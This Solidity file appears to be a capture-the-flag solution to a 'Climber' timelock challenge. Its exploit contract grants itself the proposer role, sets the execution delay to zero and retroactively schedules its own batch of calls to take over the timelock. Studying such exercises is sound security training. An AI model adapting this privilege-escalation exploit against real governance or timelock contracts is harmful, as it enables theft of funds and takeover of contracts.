// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberConstants.sol";
import "./ClimberTimelock.sol";

contract AttackTimelock {
    address payable immutable timelock;
    address immutable owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Unauthorized");
        _;
    }

    constructor(address payable _timelock) {
        timelock = _timelock;
        owner = msg.sender;
    }

    function takeover(bytes32 salt) external {
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        // Grant the PROPOSER_ROLE to ourselves
        targets[0] = timelock;
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        //Set the execution delay to zero, for scheduled tasks to be immidiately runnable.
        targets[1] = timelock;
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // Self-schedule this call.
        // This is the main trick, where we retro-actively schedule the scheduling.
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature("takeover(bytes32)", salt);

        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
    }

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external onlyOwner {
        ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
    }
}
